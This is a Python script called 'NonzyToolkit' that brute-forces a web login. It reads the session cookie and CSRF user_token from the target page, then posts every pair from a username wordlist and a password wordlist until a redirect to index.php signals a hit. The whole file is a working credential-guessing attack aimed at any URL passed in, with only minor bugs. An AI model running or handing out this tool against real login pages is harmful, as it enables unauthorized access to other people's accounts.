#!/usr/bin/env python

from bs4 import BeautifulSoup
import requests
import re
import optparse
import pyfiglet 
from termcolor import colored

#banner-text
banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print(" Written By Iwundu Chinonso")
print colored("=" * 60, "green")

def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="target", help="target url")
	parser.add_option("-w", "--wordlist", dest="wordlist", help="Wordlist")
	parser.add_option("-p", "--passwordlist", dest="passwordlist", help="Password file")
	parser.add_option("-v", "--verbose", dest="verbose", help="verbose")
	(options, arguments) = parser.parse_args()
	
	if not options.target:
		parser.error("target url is required")	
	if not options.wordlist:
		parser.error("Wordlist is required")	
	if not options.passwordlist:
		parser.error("passwordlist is required")	
	return options

options = get_arguments()

#url to attack
url = options.target

#get users
user_file = options.wordlist
fd = open(user_file, "r")
users = fd.readlines()
fd.close()

#get passwords
password_file = options.passwordlist
fd = open(password_file, "r")
passwords = fd.readlines()
fd.close()

#changes to true when user/pass found
done = False

print colored("Bruteforcing " + url + "\n", "yellow")

#get login page

try:
	r = requests.get(url, timeout=5)
except ConnectionRefusedError:
	print colored("Unable to reach server! Quitting!", "red")

#extract session_id 
session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
session_id = session_id.group(1)

print("Session ID: " + session_id)
cookie = {"PHPSESSID": session_id}

#prepare soup
soup = BeautifulSoup(r.text, "html.parser")

#get user_token value
user_token = soup.find("input", {"name":"user_token"})["value"]

print("User token: " + user_token + "\n")

for user in users:
	user = user.rstrip()
	for password in passwords:
		if not done:
			password = password.rstrip()
			payload = {"username": user, "password": password, "Login": "Login", "user_token": user_token}

			reply = requests.post(url, payload, cookies=cookie, allow_redirects=False)

			result = reply.headers["Location"]
			
			#verbose option
			if options.verbose:
				print colored("trying: " + user + ", " + password,"yellow")

			if "index.php" in result:
				print colored("User: " + user + " \tPassword: " + password, "green")
				done = True
		